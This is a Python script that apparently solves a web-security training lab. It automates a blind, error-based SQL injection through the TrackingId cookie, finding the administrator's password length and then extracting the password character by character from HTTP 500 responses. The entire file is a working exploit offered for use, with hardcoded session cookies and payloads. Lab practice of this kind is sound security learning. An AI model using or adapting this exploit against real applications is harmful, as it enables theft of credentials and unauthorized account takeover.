import requests
url = "https://0a4c007903d82c9b800230c300930009.web-security-academy.net/filter?category=Pets"
characters ='abcdefghijklmnopqrstuvwxyz1234567890'

def get_len():
    for i in range(1,101):
        cookie = {'TrackingId':'yRgE6puHtnRhCJsN', 'session':'Q6YHfVjHWx4D90JYHdTVI7VFwgvGIHC5'}
        payload = f"' || (SELECT CASE WHEN (LENGTH((SELECT password from users where username = 'administrator'))={i}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--"
        cookie['TrackingId']= cookie['TrackingId']+payload
        r = requests.get(url, cookies = cookie)
        if r.status_code==500:
            return i

# SUBSTRING((SELECT password from users where username = 'administrator'),{i},1) = '{char}'
def get_data(length):
    temp = ""
    for i in range(1,length+1):
        for char in characters:
            cookie = {'TrackingId':'yRgE6puHtnRhCJsN', 'session':'Q6YHfVjHWx4D90JYHdTVI7VFwgvGIHC5'}
            payload = f"' || (SELECT CASE WHEN (SUBSTR((SELECT password from users where username = 'administrator'),{i},1) = '{char}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--"
            cookie['TrackingId']= cookie['TrackingId']+payload
            r = requests.get(url, cookies = cookie)
            if r.status_code== 500:
                temp += char
                print(temp)
                break
    return temp



length = get_len()
print(f"Password length: {length}")
print("Dumping Data... Please be patient.")
data = get_data(20)
print(f"Got it!: {data}")
